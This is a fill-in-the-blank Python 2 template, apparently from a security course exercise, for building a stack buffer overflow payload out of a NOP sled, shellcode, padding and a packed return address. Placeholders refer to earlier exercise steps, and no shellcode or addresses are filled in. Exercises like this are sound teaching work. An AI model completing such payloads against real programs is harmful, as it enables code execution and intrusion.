from struct import pack

buffer_length_to_return = <LENGTH YOU FOUND FROM STEP 4>

nop_sled = "\x90"*<YOUR JOB TO FIGURE OUT>

#NOTE: this is in regular hex format, i.e. 0xffffdeadbeef
sled_addr = <ADDRESS YOU SAVED FROM STEP 2>


<BUFFER CODE FROM STEP 6>

                              
padding = "A"*(buffer_length_to_return - len(nop_sled) - len(buf))

payload = nop_sled + buf + padding + pack("<Q", sled_addr)

print payload

